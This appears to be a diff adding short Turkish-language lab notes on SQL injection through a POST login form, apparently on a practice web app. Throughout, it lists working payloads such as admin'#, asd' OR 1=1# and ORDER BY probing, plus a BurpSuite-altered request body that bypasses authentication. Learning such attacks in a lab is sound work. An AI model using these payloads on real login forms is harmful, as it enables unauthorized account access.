@@ -1,0 +1,21 @@
+SQL INJECTION (POST METHOD)
+
+password:' yazarak hata alıyor muyuz bakabiliriz.
+
+alinan hata(sitede çalıştırılan komut:
+SELECT * FROM accounts WHERE username='admin' AND password='''
+
+username: asd
+password: password' AND 1=1#		-> 1=1 komutunu da çalıştırmayi basardik.
+
+username: admin'#		-> Kullanici adini bildikten sonra şifreyi bilmemiz artık önemli değil.
+password: 
+
+username: neon
+password: asd' OR 1=1#
+
+password: 123456' ORDER BY 1#	-> (123456:true_pass)Çalışırsa SQL Açığı var demektir.
+
+Güvenlik seviyesi arttığında bunu da kabul etmeyecektir.
+Bunu çözmek için ise BurpSuite üzerinden password: section'ını değiştirebiliriz.
+> username=neon&password=asd' OR 1=1#&login-php-submit-button=Login
